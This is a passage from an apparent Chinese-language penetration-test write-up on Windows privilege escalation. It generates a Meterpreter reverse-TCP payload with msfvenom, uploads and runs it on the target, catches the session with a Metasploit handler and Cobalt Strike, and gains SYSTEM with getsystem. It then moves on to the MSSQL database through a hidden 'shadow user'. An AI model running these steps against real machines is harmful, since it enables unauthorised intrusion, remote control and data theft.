## **0x03 提权**

### **方式一（漏洞利用）**

cs中执行run systeminfo收集目标安装的补丁，使用在线提权辅助工具查看能够利用的漏洞。查找exp并利用即可。

### **方式二（msf辅助提权）**

要想利用msf辅助提权，必须要反弹shell到msf

一方面可以利用cs在目标机上执行msf生成的木马上线msf。我这里是cs服务端和msf在同一vps上

```


msfvenom -p windows/meterpreter\_reverse\_tcp lhost=x.x.x.x lport=8888 -f exe > shell.exe
```

将shell.exe上传至目标并执行，即可看到msf已上线

![](../Images/45eef8ce0e87de080a8cb044cf7f2a63.png)

![](../Images/258261c32d61a9a0c9538ed5a62bd56d.png)

或者直接通过cs进行会话派生spawncs上创建监听器

![](../Images/50f07bebc49311ec21b669391931774f.png)

msf进行配置，注意这里两个payload要相互对应

```


use exploit/multi/handler
```

![](../Images/75629b8761d5cac9c84940ba555d9c79.png)

在msf中getuid查看到当前用户为mssqlsserver，利用msf自带的提权getsystem，居然直接就提权成功，拿到了system权限。

![](../Images/afdb69c93018cf0b52f529c816cfb85c.png)

然后再利用system权限执行cs生成的shell，上线之后就是system权限了

![](../Images/f2247e91b47c13cace0abb00b9066e0a.png)

当然我们获得system权限后可以注入进程，更安全一些

![](../Images/3d49dd4624b23bd69e0ac3e3b549e445.png)

![](../Images/24b380cfee5dffebda9cbf89fd884c82.png)

现在既然已经拿到了最高权限，那就可以为所欲为了。

### **数据库**

将mssql设置为windows登录验证，用影子用户连上他们的数据库看看
